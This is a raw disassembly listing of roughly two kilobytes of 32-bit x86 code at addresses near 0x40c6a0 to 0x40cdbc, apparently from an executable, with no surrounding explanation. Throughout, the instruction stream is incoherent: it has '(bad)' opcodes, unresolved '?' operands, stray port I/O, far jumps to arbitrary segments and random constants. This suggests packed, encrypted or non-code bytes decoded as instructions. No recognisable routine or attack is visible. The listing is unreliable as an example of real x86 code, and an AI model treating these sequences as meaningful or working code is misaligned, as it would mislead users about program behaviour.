  40c6a0:	ds mov cl,0x7d
  40c6a3:	adc    eax,0xd21bdb9f
  40c6a8:	push   edi
  40c6a9:	call   0x9d2d6d3d
  40c6ae:	sbb    edi,DWORD PTR [edx]
  40c6b0:	leave  
  40c6b1:	out    0x72,al
  40c6b3:	xchg   ebx,eax
  40c6b4:	xchg   BYTE PTR [ebx-0x64],dh
  40c6b7:	push   ebp
  40c6b8:	jno    0x40c667
  40c6ba:	cmp    eax,0x910fd57e
  40c6bf:	retf   
  40c6c0:	jno    0x40c6d9
  40c6c2:	pop    ecx
  40c6c3:	push   esp
  40c6c4:	aas    
  40c6c5:	test   eax,0xc3988593
  40c6ca:	mov    BYTE PTR [esi+0x7f],bl
  40c6cd:	scas   eax,DWORD PTR es:[edi]
  40c6ce:	loop   0x40c661
  40c6d0:	jl     0x40c72a
  40c6d2:	clc    
  40c6d3:	(bad)  
  40c6d5:	jge    0x40c706
  40c6d7:	repz pop ebx
  40c6d9:	loopne 0x40c74e
  40c6db:	jne    0x40c730
  40c6dd:	pop    edi
  40c6de:	add    BYTE PTR [ebx-0x63],dh
  40c6e1:	cmp    al,0xa1
  40c6e3:	stos   BYTE PTR es:[edi],al
  40c6e4:	pusha  
  40c6e5:	fnstcw WORD PTR [edx]
  40c6e7:	sar    esi,cl
  40c6e9:	lea    ebp,[ebx+0x7a956928]
  40c6ef:	fnstsw WORD PTR [ebx+0x18]
  40c6f2:	pop    ecx
  40c6f3:	pop    ebx
  40c6f4:	or     al,0x6a
  40c6f6:	popa   
  40c6f7:	shr    edx,cl
  40c6f9:	mov    dh,cl
  40c6fb:	and    ch,BYTE PTR ds:0x9377028d
  40c701:	sub    al,0x60
  40c703:	pop    esp
  40c704:	xchg   edi,eax
  40c705:	pushf  
  40c706:	mov    al,ds:0xa513e541
  40c70b:	xor    al,0xe
  40c70d:	in     eax,dx
  40c70e:	pop    es
  40c70f:	rcl    bl,0x81
  40c712:	shl    ch,cl
  40c714:	enter  0x6089,0x3d
  40c718:	push   ss
  40c719:	xor    eax,0x43d3928c
  40c71e:	xchg   edx,eax
  40c71f:	sti    
  40c720:	data16 and al,0x27
  40c723:	inc    edx
  40c724:	test   al,0xf7
  40c726:	and    eax,0x6533d3c8
  40c72b:	adc    eax,0x78864350
  40c730:	je     0x40c73f
  40c732:	gs adc eax,0xa20e2ab4
  40c738:	add    al,0x8
  40c73a:	in     al,0x8e
  40c73c:	scas   eax,DWORD PTR es:[edi]
  40c73d:	lds    ebp,FWORD PTR [ecx+0x4e390885]
  40c743:	mov    BYTE PTR [ebp-0x4b10a812],cl
  40c749:	mov    ah,0xd7
  40c74b:	ds jle 0x40c72a
  40c74e:	lahf   
  40c74f:	xlat   BYTE PTR ds:[ebx]
  40c750:	mov    DWORD PTR [edi],edx
  40c752:	push   ecx
  40c753:	mov    WORD PTR [ecx+eiz*4-0x18],?
  40c757:	sub    al,0x82
  40c759:	pop    esi
  40c75a:	push   ebp
  40c75b:	mov    edx,0x165f9cb5
  40c760:	je     0x40c6ef
  40c762:	std    
  40c763:	mov    ecx,0xc7e71380
  40c768:	rcl    BYTE PTR [esi+0x3d],0xd3
  40c76c:	push   edx
  40c76d:	cdq    
  40c76e:	or     ebp,DWORD PTR [eax+0x12]
  40c771:	stc    
  40c772:	inc    ecx
  40c773:	push   0xffffff94
  40c775:	adc    ecx,DWORD PTR [ebp-0x17]
  40c778:	fistp  WORD PTR [ebp-0x2632bfbd]
  40c77e:	das    
  40c77f:	xchg   ecx,eax
  40c780:	cld    
  40c781:	jbe    0x40c7ca
  40c783:	add    al,0x3e
  40c785:	mov    bh,0xe2
  40c787:	lock lahf 
  40c789:	pop    ss
  40c78a:	push   ebp
  40c78b:	aaa    
  40c78c:	outs   dx,DWORD PTR ds:[esi]
  40c78d:	clc    
  40c78e:	xchg   DWORD PTR [edi],esi
  40c790:	test   DWORD PTR [eax-0x16],0xf65514dd
  40c797:	imul   esi,edi,0xfffffff7
  40c79a:	xchg   ebx,eax
  40c79b:	rcl    BYTE PTR [ecx],1
  40c79d:	add    esp,DWORD PTR [eax+0x70e0127f]
  40c7a3:	test   eax,0x7506d0f2
  40c7a8:	mov    ebx,0x9e29731c
  40c7ad:	(bad)  
  40c7af:	push   edx
  40c7b0:	test   BYTE PTR [edx-0x74],dl
  40c7b3:	adc    eax,0x35fdc659
  40c7b8:	mov    edi,0x93ac22e3
  40c7bd:	adc    DWORD PTR [ebx],0x32
  40c7c0:	mov    dh,0xfc
  40c7c2:	int    0x97
  40c7c4:	push   ebp
  40c7c5:	push   edi
  40c7c6:	dec    edx
  40c7c7:	test   eax,0x9ec0123e
  40c7cc:	adc    al,0x8a
  40c7ce:	outs   dx,DWORD PTR ds:[esi]
  40c7cf:	jbe    0x40c81a
  40c7d1:	push   ss
  40c7d2:	ins    BYTE PTR es:[edi],dx
  40c7d3:	outs   dx,DWORD PTR ds:[esi]
  40c7d4:	hlt    
  40c7d5:	aaa    
  40c7d6:	and    al,0x24
  40c7d8:	jns    0x40c84c
  40c7da:	pop    edi
  40c7db:	ja     0x40c7b4
  40c7dd:	shl    BYTE PTR [ebx+0xc],cl
  40c7e0:	inc    ecx
  40c7e1:	and    dh,dl
  40c7e3:	lods   al,BYTE PTR ds:[esi]
  40c7e4:	cmp    edi,ebx
  40c7e6:	jno    0x40c804
  40c7e8:	aaa    
  40c7e9:	arpl   WORD PTR [esi+ebp*8-0x474766ae],si
  40c7f0:	mov    ch,0x9c
  40c7f2:	arpl   WORD PTR [esi-0x39],ax
  40c7f5:	jl     0x40c77a
  40c7f7:	xor    ecx,DWORD PTR [esi+eiz*2-0x26b8bc9c]
  40c7fe:	sub    BYTE PTR [ecx+0xc],ch
  40c801:	push   edx
  40c802:	dec    ecx
  40c803:	jg     0x40c838
  40c805:	test   esp,edx
  40c807:	test   al,0x51
  40c809:	or     ebp,esp
  40c80b:	mov    al,BYTE PTR [ebp-0x32]
  40c80e:	sub    DWORD PTR [eax],ecx
  40c810:	cmp    ebx,DWORD PTR [ebx]
  40c812:	cmp    dh,BYTE PTR [edi]
  40c814:	fidivr WORD PTR [eax-0x7b]
  40c817:	jnp    0x40c7b0
  40c819:	inc    ebx
  40c81a:	cmp    BYTE PTR [eax],0x70
  40c81d:	dec    esp
  40c81e:	data16 outs dx,BYTE PTR ds:[esi]
  40c820:	iret   
  40c821:	jle    0x40c898
  40c823:	mov    ebp,ds
  40c825:	inc    ecx
  40c826:	pop    es
  40c827:	sub    ah,ch
  40c829:	push   eax
  40c82a:	pop    ebp
  40c82b:	sub    edi,DWORD PTR [eax+ebx*8-0x63]
  40c82f:	mov    DWORD PTR [ebp+0x72b07d05],ebx
  40c835:	call   0x467f:0x7982784d
  40c83c:	sbb    DWORD PTR [edx],ebp
  40c83e:	and    DWORD PTR [ecx+0x6f15b80a],ecx
  40c844:	loope  0x40c7e5
  40c846:	ret    0xe499
  40c849:	bound  ebx,QWORD PTR [ecx]
  40c84b:	jmp    0x40c814
  40c84d:	outs   dx,BYTE PTR ds:[esi]
  40c84e:	xchg   esi,eax
  40c84f:	stos   DWORD PTR es:[edi],eax
  40c850:	jp     0x40c8c7
  40c852:	std    
  40c853:	ret    
  40c854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c855:	mov    edi,0xe95db6b
  40c85a:	je     0x40c853
  40c85c:	adc    dh,bl
  40c85e:	aas    
  40c85f:	lea    edi,[edx-0x4cbab475]
  40c865:	clc    
  40c866:	das    
  40c867:	sbb    edx,DWORD PTR [edi-0x39]
  40c86a:	and    BYTE PTR [eax+0x6c],bl
  40c86d:	jae    0x40c829
  40c86f:	mov    eax,0x86c23741
  40c874:	(bad)  
  40c876:	pop    edx
  40c878:	out    0x5a,al
  40c87a:	cmp    DWORD PTR [edx+0x36e8eff3],ebx
  40c880:	shl    eax,0x5a
  40c883:	sbb    esp,DWORD PTR [edx+0x7f]
  40c886:	lahf   
  40c887:	and    edx,eax
  40c889:	pusha  
  40c88a:	outs   dx,DWORD PTR ds:[esi]
  40c88c:	jmp    0x40c898
  40c88e:	sbb    BYTE PTR [ebx-0x51],cl
  40c891:	hlt    
  40c892:	inc    esp
  40c893:	sbb    ecx,edi
  40c895:	xor    al,0x99
  40c897:	cmp    al,0x28
  40c899:	sar    BYTE PTR [edi],1
  40c89b:	cli    
  40c89c:	pop    edi
  40c89d:	inc    esi
  40c89e:	push   edx
  40c89f:	mov    ebx,0xfeef3abd
  40c8a4:	aad    0xc7
  40c8a6:	imul   eax,esi,0x11
  40c8a9:	mov    ds:0x331ff5d4,eax
  40c8ae:	pop    ss
  40c8af:	sub    dh,BYTE PTR [eax+0x79215957]
  40c8b5:	cmp    ch,BYTE PTR [esi+edi*2]
  40c8b8:	inc    BYTE PTR [esi]
  40c8ba:	sbb    al,0xfd
  40c8bc:	jnp    0x40c8fc
  40c8be:	and    eax,0xd317b24e
  40c8c3:	xor    eax,0x62ac514d
  40c8c8:	retf   0xe965
  40c8cb:	pushf  
  40c8cc:	mov    ebp,0x2422edf
  40c8d1:	xchg   ecx,eax
  40c8d2:	sub    cl,ah
  40c8d4:	mov    dl,ch
  40c8d6:	push   ecx
  40c8d7:	xchg   edx,eax
  40c8d8:	cmp    eax,DWORD PTR [eax-0x413e5ab3]
  40c8de:	aaa    
  40c8df:	loope  0x40c873
  40c8e1:	add    ch,BYTE PTR [eax]
  40c8e3:	mov    al,0x46
  40c8e5:	icebp  
  40c8e6:	cwde   
  40c8e7:	popf   
  40c8e8:	int3   
  40c8e9:	daa    
  40c8ea:	sbb    eax,0xf13b772
  40c8ef:	sub    al,0x30
  40c8f1:	js     0x40c8a9
  40c8f3:	xor    cl,BYTE PTR [eax+0x18]
  40c8f6:	pop    ecx
  40c8f7:	cmp    BYTE PTR [eax],dl
  40c8f9:	mov    dl,0xcc
  40c8fb:	fist   WORD PTR [edx-0x70474aa7]
  40c901:	xor    eax,0x4799114f
  40c906:	(bad)  [edx+0x18]
  40c909:	mov    eax,0x93b78957
  40c90e:	xchg   DWORD PTR [edi+0x14],eax
  40c911:	shl    al,1
  40c913:	repz jns 0x40c941
  40c916:	outs   dx,BYTE PTR ds:[esi]
  40c917:	das    
  40c918:	lea    esi,[edi-0x62504fb1]
  40c91e:	imul   edx,DWORD PTR [eax],0xffffff95
  40c921:	mov    cl,0x19
  40c923:	sub    al,0x7
  40c925:	pop    ebp
  40c926:	fiadd  DWORD PTR [esi-0x7666de9b]
  40c92c:	xor    cl,BYTE PTR [esi+edi*4+0x737f13cd]
  40c933:	stc    
  40c934:	je     0x40c9ad
  40c936:	pop    ss
  40c937:	sbb    edx,DWORD PTR [ebx-0x186dd9eb]
  40c93d:	sub    al,0xa9
  40c93f:	mov    bl,BYTE PTR [edi]
  40c941:	lea    ebp,[eax+0x7c864dc2]
  40c947:	int    0x98
  40c949:	dec    eax
  40c94a:	or     al,0x51
  40c94c:	ret    
  40c94d:	or     al,0x2b
  40c94f:	jns    0x40c905
  40c951:	fst    QWORD PTR [edi+edi*1-0x350750d2]
  40c958:	lods   al,BYTE PTR ds:[esi]
  40c959:	es je  0x40c929
  40c95c:	adc    edi,DWORD PTR [edx+ecx*1+0x68ae8024]
  40c963:	add    BYTE PTR [esi],0xf3
  40c966:	add    BYTE PTR [ecx+0x500f98a4],al
  40c96c:	push   ds
  40c96d:	sahf   
  40c96e:	xchg   edi,eax
  40c96f:	retf   0x692e
  40c972:	xchg   edi,eax
  40c973:	cmp    esi,edx
  40c975:	and    BYTE PTR ds:0xb6c1f419,0x1b
  40c97c:	jae    0x40c9b3
  40c97e:	sub    eax,0x4fe730ac
  40c983:	aas    
  40c984:	adc    ebx,DWORD PTR [esi-0x6de72146]
  40c98a:	mov    ch,0x98
  40c98c:	not    DWORD PTR [edi+0x7e]
  40c98f:	xor    esp,edx
  40c991:	mov    ah,0x10
  40c993:	sahf   
  40c994:	in     eax,dx
  40c995:	out    dx,al
  40c996:	mov    eax,0xb8c41d8
  40c99b:	jno    0x40c993
  40c99d:	outs   dx,BYTE PTR ds:[esi]
  40c99e:	or     bl,BYTE PTR [eax-0x5c8b1b63]
  40c9a4:	not    DWORD PTR [ebx-0x58]
  40c9a7:	adc    DWORD PTR [edi],edx
  40c9a9:	(bad)  
  40c9aa:	sahf   
  40c9ab:	cli    
  40c9ac:	cmc    
  40c9ad:	inc    eax
  40c9ae:	test   ah,0x31
  40c9b1:	inc    esp
  40c9b2:	hlt    
  40c9b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9b4:	xchg   esi,eax
  40c9b5:	adc    DWORD PTR [eax-0x56358fe8],ebp
  40c9bb:	jmp    0x40c95f
  40c9bd:	cs lock jae 0x40c95e
  40c9c1:	stos   DWORD PTR es:[edi],eax
  40c9c2:	sbb    al,0x5e
  40c9c4:	dec    edi
  40c9c5:	fs test al,0xdb
  40c9c8:	push   0xc
  40c9ca:	xor    ah,bl
  40c9cc:	jne    0x40c9ec
  40c9ce:	or     DWORD PTR [esi],0xff560fc9
  40c9d4:	xchg   DWORD PTR [edx-0x16],edx
  40c9d7:	pushf  
  40c9d8:	sti    
  40c9d9:	add    DWORD PTR [esi-0x1d],edi
  40c9dc:	xchg   esi,eax
  40c9dd:	int3   
  40c9de:	dec    esp
  40c9df:	cld    
  40c9e0:	sub    DWORD PTR [ecx-0x5783b879],edx
  40c9e6:	pop    edx
  40c9e7:	jbe    0x40c9d9
  40c9e9:	fld    TBYTE PTR [edi-0x2dc8fe43]
  40c9ef:	(bad)  
  40c9f0:	data16 mov cl,0x1d
  40c9f3:	dec    edx
  40c9f4:	dec    edi
  40c9f5:	mov    BYTE PTR [ecx+eiz*4],bl
  40c9f8:	(bad)  
  40c9fa:	ror    DWORD PTR [edi],1
  40c9fc:	aad    0x0
  40c9fe:	sbb    eax,ebx
  40ca00:	pusha  
  40ca01:	jnp    0x40c9ad
  40ca03:	dec    ecx
  40ca04:	je     0x40c9cf
  40ca06:	test   eax,0x2bd197e5
  40ca0b:	push   ss
  40ca0c:	inc    edi
  40ca0d:	mov    ds:0x696ac6ad,eax
  40ca12:	or     al,BYTE PTR [ecx+0x23]
  40ca15:	dec    ecx
  40ca16:	pop    ds
  40ca17:	mov    cl,0xb8
  40ca19:	out    0x3a,al
  40ca1b:	clc    
  40ca1c:	add    ch,BYTE PTR [edx+0x7dfb77dd]
  40ca22:	sub    BYTE PTR [ecx-0x6e],ah
  40ca25:	pusha  
  40ca26:	cmp    DWORD PTR [edi],0x5b
  40ca29:	cmp    al,0xb7
  40ca2b:	inc    esi
  40ca2c:	sbb    edi,ebp
  40ca2e:	shl    BYTE PTR [edi-0x56e5fbf5],1
  40ca34:	jecxz  0x40caad
  40ca36:	dec    edi
  40ca37:	add    DWORD PTR [edi+0x7f],ebp
  40ca3a:	lahf   
  40ca3b:	(bad)  
  40ca3c:	repz push 0x17
  40ca3f:	dec    esp
  40ca40:	xchg   DWORD PTR [edx-0x46],esp
  40ca43:	mov    ch,0x73
  40ca45:	stc    
  40ca46:	clc    
  40ca47:	push   eax
  40ca48:	leave  
  40ca49:	push   ds
  40ca4a:	scas   eax,DWORD PTR es:[edi]
  40ca4b:	fimul  DWORD PTR [ebp+0x66]
  40ca4e:	retf   0x5030
  40ca51:	je     0x40cac5
  40ca53:	jp     0x40ca59
  40ca55:	dec    ebx
  40ca56:	es add BYTE PTR es:[edx-0x5041e6e1],al
  40ca5e:	les    ebp,FWORD PTR [edi-0x7bacbf27]
  40ca64:	sbb    ecx,DWORD PTR [edx]
  40ca66:	(bad)  
  40ca67:	dec    ebx
  40ca68:	cdq    
  40ca69:	stos   DWORD PTR es:[edi],eax
  40ca6a:	stos   BYTE PTR es:[edi],al
  40ca6b:	inc    ebx
  40ca6c:	imul   eax,DWORD PTR [edx+0x3f923dad],0xffffffa4
  40ca73:	jb     0x40caef
  40ca75:	or     al,0xec
  40ca77:	jne    0x40cab8
  40ca79:	fldenv [esi]
  40ca7b:	xor    BYTE PTR [ecx-0x5a87db3],0xd4
  40ca82:	loope  0x40ca3c
  40ca84:	dec    esi
  40ca85:	xor    eax,DWORD PTR [eax+0x70]
  40ca88:	imul   edx,ebx,0x4a
  40ca8b:	or     eax,0xa0e37af2
  40ca90:	mov    edi,0x6a29b9db
  40ca95:	test   al,0xa8
  40ca97:	movups XMMWORD PTR [ebx+0x1b],xmm4
  40ca9b:	mul    BYTE PTR [ebx-0x5c]
  40ca9e:	mov    bl,0x7f
  40caa0:	push   esi
  40caa1:	jbe    0x40ca88
  40caa3:	pusha  
  40caa4:	test   DWORD PTR [ebx],edi
  40caa6:	pop    ds
  40caa7:	add    dl,dh
  40caa9:	sub    BYTE PTR [edx+ecx*4],dl
  40caac:	xchg   ebx,eax
  40caad:	sti    
  40caae:	ds sahf 
  40cab0:	jbe    0x40caca
  40cab2:	xlat   BYTE PTR ds:[ebx]
  40cab3:	pop    ds
  40cab4:	hlt    
  40cab5:	adc    esp,DWORD PTR [edx-0x4caceb74]
  40cabb:	dec    esp
  40cabc:	mov    ?,ebx
  40cabe:	adc    dl,BYTE PTR [edx+eax*1+0x1251ac93]
  40cac5:	xor    eax,0x8721970f
  40caca:	jne    0x40ca92
  40cacc:	outs   dx,BYTE PTR ds:[esi]
  40cacd:	mov    ah,0x21
  40cacf:	pop    es
  40cad0:	mov    ecx,0x62571db6
  40cad5:	dec    esp
  40cad6:	cld    
  40cad7:	icebp  
  40cad8:	xor    ebx,esi
  40cada:	sbb    bh,BYTE PTR [ebx+0x78944d6f]
  40cae0:	xchg   edx,eax
  40cae1:	sub    BYTE PTR [esi+ecx*8+0xd1317f7],bh
  40cae8:	xchg   DWORD PTR [eax],ebp
  40caea:	adc    dh,cl
  40caec:	pop    es
  40caed:	imul   edi,edi,0xcdbbd67
  40caf3:	pop    ecx
  40caf4:	add    al,0xe4
  40caf6:	arpl   ax,ax
  40caf8:	cmp    al,0x5e
  40cafa:	mov    ?,WORD PTR [ebx]
  40cafc:	popf   
  40cafd:	fs push esi
  40caff:	xchg   edx,eax
  40cb00:	test   DWORD PTR [edi+0xb831a77],eax
  40cb06:	dec    edi
  40cb07:	push   cs
  40cb08:	es jb  0x40cab1
  40cb0b:	xchg   ecx,eax
  40cb0c:	jl     0x40cae7
  40cb0e:	retf   
  40cb0f:	fistp  WORD PTR [eax]
  40cb11:	daa    
  40cb12:	sub    al,0x9c
  40cb14:	or     DWORD PTR [ebx+ebx*1],edi
  40cb17:	daa    
  40cb18:	fidivr WORD PTR [edi+0x7e1cb70f]
  40cb1e:	out    0x51,al
  40cb20:	push   esp
  40cb21:	adc    ah,cl
  40cb23:	adc    ecx,edi
  40cb25:	cmp    cl,BYTE PTR [esi+0x7ff2e914]
  40cb2b:	adc    eax,0x340a4299
  40cb30:	xor    DWORD PTR [edi+edi*8-0x74],edi
  40cb34:	cmp    eax,DWORD PTR [ebx]
  40cb36:	test   DWORD PTR gs:[esi],edx
  40cb39:	jbe    0x40cb10
  40cb3b:	sbb    BYTE PTR fs:[esp+ecx*1-0x5b],0x89
  40cb41:	dec    esp
  40cb42:	dec    ebp
  40cb43:	loopne 0x40cb8f
  40cb45:	outs   dx,BYTE PTR ds:[esi]
  40cb46:	xor    BYTE PTR ds:0xbfa619f8,al
  40cb4c:	xchg   ebx,eax
  40cb4d:	neg    DWORD PTR [ecx+0x493e4af5]
  40cb53:	sub    al,0x9e
  40cb55:	push   0x92bf318
  40cb5a:	xchg   ecx,eax
  40cb5b:	aam    0x62
  40cb5d:	push   ebp
  40cb5e:	xchg   esp,eax
  40cb5f:	(bad)  
  40cb61:	mov    ecx,0x122f62ee
  40cb66:	push   ebp
  40cb67:	iret   
  40cb68:	jg     0x40cb4e
  40cb6a:	jmp    0xdbd0f611
  40cb6f:	(bad)  
  40cb71:	rcl    BYTE PTR [edx+0x78],0xa7
  40cb75:	ror    DWORD PTR [eax],1
  40cb77:	cwde   
  40cb78:	mov    eax,ds:0xc1e6583f
  40cb7d:	out    dx,eax
  40cb7e:	mov    ch,bh
  40cb80:	jmp    0x14de:0x23cb1c97
  40cb87:	icebp  
  40cb88:	sub    DWORD PTR [eax+0x3f],edx
  40cb8b:	xor    DWORD PTR [eax],eax
  40cb8d:	sub    DWORD PTR [ebx+0x22],ebx
  40cb90:	cmc    
  40cb91:	dec    esp
  40cb92:	push   ebx
  40cb93:	out    dx,al
  40cb94:	int    0x80
  40cb96:	ss cdq 
  40cb98:	clc    
  40cb99:	aaa    
  40cb9a:	sub    eax,0xbbe5a9d2
  40cb9f:	add    BYTE PTR [esi],bl
  40cba1:	cmp    BYTE PTR [esp+eiz*2],al
  40cba4:	dec    eax
  40cba5:	dec    ebp
  40cba6:	and    al,0xdd
  40cba8:	mov    ebx,0xb5a04321
  40cbad:	or     al,0x86
  40cbaf:	push   ecx
  40cbb0:	sbb    ebp,0x66
  40cbb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbb4:	out    0xd2,al
  40cbb6:	rcr    DWORD PTR [ebp+esi*1+0x52],0x14
  40cbbb:	cmp    al,0xc9
  40cbbd:	cmp    ch,BYTE PTR [edx-0x58fddb13]
  40cbc3:	imul   edi,DWORD PTR [ecx-0x69eea1b3],0xaa1f8cb4
  40cbcd:	or     esp,ebp
  40cbcf:	loopne 0x40cbf6
  40cbd1:	xchg   ebp,eax
  40cbd2:	push   0x5e
  40cbd4:	icebp  
  40cbd5:	ins    DWORD PTR es:[edi],dx
  40cbd6:	add    al,0x42
  40cbd8:	cwde   
  40cbd9:	xor    ch,BYTE PTR [ebp-0x2a]
  40cbdc:	imul   ecx,DWORD PTR [edi],0x40
  40cbdf:	scas   eax,DWORD PTR es:[edi]
  40cbe0:	push   ebx
  40cbe1:	xor    eax,0x64e17c07
  40cbe6:	jl     0x40cbe1
  40cbe8:	dec    esp
  40cbe9:	add    esi,DWORD PTR [edx-0x2c5be391]
  40cbef:	cld    
  40cbf0:	aad    0x93
  40cbf2:	aaa    
  40cbf3:	(bad)  
  40cbf4:	imul   ebp,DWORD PTR [si],0x77b0960f
  40cbfb:	repnz or DWORD PTR [ebp+0x734cd5be],ebp
  40cc02:	clc    
  40cc03:	xchg   BYTE PTR [eax+ecx*4-0x61],dh
  40cc07:	pusha  
  40cc08:	add    al,0x75
  40cc0a:	icebp  
  40cc0b:	dec    edi
  40cc0c:	test   al,0xbe
  40cc0e:	callw  0xbacd
  40cc12:	dec    ecx
  40cc13:	pop    eax
  40cc14:	push   edx
  40cc15:	rep stos DWORD PTR es:[edi],eax
  40cc17:	dec    eax
  40cc18:	push   ds
  40cc19:	jb     0x40cc16
  40cc1b:	pushf  
  40cc1c:	xchg   edi,eax
  40cc1d:	sbb    al,0x2b
  40cc1f:	and    al,0xd
  40cc21:	inc    ebx
  40cc22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc23:	and    DWORD PTR ds:[edx+0x76e536c6],edx
  40cc2a:	lock or dh,bl
  40cc2d:	jbe    0x40cbe7
  40cc2f:	jecxz  0x40cbda
  40cc31:	or     DWORD PTR [esi+0x5569d0f9],ebp
  40cc37:	xchg   ecx,eax
  40cc38:	xchg   ebx,eax
  40cc39:	and    dh,dh
  40cc3b:	and    ebx,ebx
  40cc3d:	outs   dx,BYTE PTR ds:[esi]
  40cc3e:	in     eax,dx
  40cc3f:	pop    ecx
  40cc40:	clc    
  40cc41:	add    al,0x47
  40cc43:	rol    DWORD PTR [esi-0x51],cl
  40cc46:	cmp    al,al
  40cc48:	jo     0x40cbdb
  40cc4a:	cmp    ch,bl
  40cc4c:	mov    esi,0xe52a2cf8
  40cc51:	push   ecx
  40cc52:	push   edi
  40cc53:	mov    esi,0x5aa7175c
  40cc58:	mov    WORD PTR [ecx-0x7b],es
  40cc5b:	ins    BYTE PTR es:[edi],dx
  40cc5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc5d:	fs jmp 0x47c3:0xec4d8857
  40cc65:	sbb    edx,ebp
  40cc67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc68:	jbe    0x40cc94
  40cc6a:	(bad)  
  40cc6b:	xlat   BYTE PTR ds:[ebx]
  40cc6c:	je     0x40cc40
  40cc6e:	jno    0x40ccb7
  40cc70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc71:	pop    es
  40cc72:	dec    ecx
  40cc73:	retf   
  40cc74:	test   al,0x4b
  40cc76:	dec    edi
  40cc77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc78:	sti    
  40cc79:	push   ds
  40cc7a:	sahf   
  40cc7b:	cs push cs
  40cc7d:	and    edx,DWORD PTR [ecx-0x3d]
  40cc80:	and    eax,0x879a1068
  40cc85:	xchg   ebp,eax
  40cc86:	in     al,0x2b
  40cc88:	jmp    ecx
  40cc8a:	jb     0x40cca6
  40cc8c:	mov    eax,ds:0x45b68236
  40cc91:	cld    
  40cc92:	xor    esp,eax
  40cc94:	mov    al,ds:0x15ba20cd
  40cc99:	jmp    0x4af8:0x281b9f69
  40cca0:	icebp  
  40cca1:	adc    ebx,eax
  40cca3:	sub    edx,ebp
  40cca5:	lock inc edx
  40cca7:	sub    ebx,edi
  40cca9:	sub    BYTE PTR [ebp-0x54],bl
  40ccac:	sti    
  40ccad:	retf   
  40ccae:	call   0xd26:0x97512620
  40ccb5:	cmp    edi,DWORD PTR [eax]
  40ccb7:	test   BYTE PTR [ecx+edi*1],cl
  40ccba:	mov    al,ds:0x7f1a17fc
  40ccbf:	mov    ebx,0xb262c7fb
  40ccc4:	es out dx,eax
  40ccc6:	xchg   esp,eax
  40ccc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccc9:	sar    edi,0x8d
  40cccc:	es push 0xffffff92
  40cccf:	out    dx,eax
  40ccd0:	cli    
  40ccd1:	mov    ?,WORD PTR [edi+eiz*8]
  40ccd4:	cwde   
  40ccd5:	xor    edi,DWORD PTR [ebx+0x54]
  40ccd8:	ret    0x33a
  40ccdb:	adc    ebx,DWORD PTR [ebx+0x2d06d429]
  40cce1:	out    0x1e,eax
  40cce3:	in     al,dx
  40cce4:	shl    eax,0x7e
  40cce7:	cmc    
  40cce8:	jb     0x40cc8c
  40ccea:	les    esi,FWORD PTR [eax+ecx*8]
  40cced:	push   ecx
  40ccee:	outs   dx,BYTE PTR ds:[esi]
  40ccef:	and    eax,0x360edeee
  40ccf4:	je     0x40ccd3
  40ccf6:	out    dx,eax
  40ccf7:	and    ecx,DWORD PTR es:[eax+0x50cbb975]
  40ccfe:	rcl    BYTE PTR [esi],1
  40cd00:	into   
  40cd01:	(bad)  
  40cd02:	cmp    ebp,DWORD PTR [eax]
  40cd04:	scas   eax,DWORD PTR es:[edi]
  40cd05:	or     edi,ecx
  40cd07:	shl    BYTE PTR [ebp+0x71],cl
  40cd0a:	lock enter 0xd95c,0x5c
  40cd0f:	sub    eax,esp
  40cd11:	xor    ebx,DWORD PTR [ebx+0x304ec9b2]
  40cd17:	mov    al,ds:0xee812758
  40cd1c:	xor    dh,dh
  40cd1e:	xchg   BYTE PTR [esi+eiz*4],bl
  40cd21:	push   ss
  40cd22:	aam    0x28
  40cd24:	adc    al,0xaa
  40cd26:	addr16 dec eax
  40cd28:	rcr    DWORD PTR [edi+0x56807096],0xc
  40cd2f:	(bad)  [ecx-0x778ca4bb]
  40cd35:	jno    0x40ccd6
  40cd37:	loop   0x40ccc3
  40cd39:	mov    al,ah
  40cd3b:	sbb    BYTE PTR [edx+0x46d46e48],dh
  40cd41:	jbe    0x40cda0
  40cd43:	dec    esi
  40cd44:	mov    bh,0x38
  40cd46:	leave  
  40cd47:	sahf   
  40cd48:	dec    ebp
  40cd49:	adc    al,BYTE PTR [esi+0x61]
  40cd4c:	aad    0x3c
  40cd4e:	add    BYTE PTR [esi-0x1b],ch
  40cd51:	mov    ds:0x729925ec,al
  40cd56:	jb     0x40cd70
  40cd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd59:	mov    edi,0xfcefbe47
  40cd5e:	or     eax,0xc87b6410
  40cd63:	arpl   WORD PTR [edx],bx
  40cd65:	(bad)  
  40cd66:	ror    bl,1
  40cd68:	jp     0x40cd60
  40cd6a:	xor    DWORD PTR [ebx-0x3fda786f],esi
  40cd70:	aaa    
  40cd71:	mov    db5,ecx
  40cd74:	(bad)  
  40cd75:	fadd   DWORD PTR [esi+edx*1]
  40cd78:	push   ecx
  40cd79:	mov    dh,bl
  40cd7b:	sub    ebp,esi
  40cd7d:	dec    esp
  40cd7e:	mov    dh,0x88
  40cd80:	mov    bh,0x5b
  40cd82:	jg     0x40cdeb
  40cd84:	pop    ds
  40cd85:	xor    eax,0xd0de9260
  40cd8a:	mov    ecx,gs
  40cd8c:	mov    ?,WORD PTR [edx]
  40cd8e:	jecxz  0x40cd39
  40cd90:	outs   dx,BYTE PTR ds:[esi]
  40cd91:	int3   
  40cd92:	sbb    dh,bh
  40cd94:	in     al,0x2f
  40cd96:	adc    BYTE PTR [eax+edi*8],0x53
  40cd9a:	and    ecx,DWORD PTR [edx-0x180b7319]
  40cda0:	inc    DWORD PTR [edx+ebx*1+0x77]
  40cda4:	je     0x40cd43
  40cda6:	in     al,0xe3
  40cda8:	dec    esi
  40cda9:	addr16 xor ebx,esi
  40cdac:	lds    ebp,FWORD PTR [ebp-0x151aa0fe]
  40cdb2:	jo     0x40cd75
  40cdb4:	xchg   edi,eax
  40cdb5:	xchg   ebx,eax
  40cdb6:	xchg   edi,eax
  40cdb7:	loop   0x40cdf4
  40cdb9:	and    esi,DWORD PTR [edi-0x63]
  40cdbc:	xchg   edx,eax
